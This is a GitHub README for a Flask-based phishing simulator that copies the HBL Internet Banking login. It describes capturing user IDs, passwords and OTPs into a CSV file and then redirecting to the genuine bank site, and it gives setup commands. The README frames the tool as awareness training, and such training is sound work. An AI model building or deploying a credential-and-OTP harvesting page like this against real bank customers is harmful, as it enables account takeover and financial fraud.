
```
    =============================================
              HBL PHISHING 
          Educational Security Awareness Tool
    =============================================
```

**Educational Security Awareness Tool**

This tool is created purely for **cybersecurity education and phishing awareness training**. It simulates an HBL Internet Banking login flow to help people understand how phishing attacks work.

> **⚠️ Important**: This project is for educational purposes only. Misusing it for real phishing or illegal activities is strictly prohibited.

### Features
- Realistic HBL login interface
- Two-step verification (User ID + Password → OTP)
- Captures entered data and saves it in `data.csv`
- After OTP, automatically redirects to the real HBL website
- Auto-opens browser when the app starts
- Clean and simple design

### How to Run

1. **Clone the repository**
   ```bash
   git clone https://github.com/soha-waris/HBL.git
   cd HBL
   ```

2. **Install dependencies**
   ```bash
   pip install flask
   ```

3. **Run the application**
   ```bash
   python app.py
   ```

The server will start at `http://127.0.0.1:5000` and your browser will open automatically.

### Project Structure
```
HBL/
├── app.py
├── data.csv          # (automatically created)
├── templates/
│   ├── login.html
│   └── otp.html
└── README.md
```

### Data Logging
All captured credentials (Username, Password, OTP) are saved in `data.csv` with timestamps for review during training sessions.



---

**Developed by: Soha Waris**

Made for educational purposes only.
```
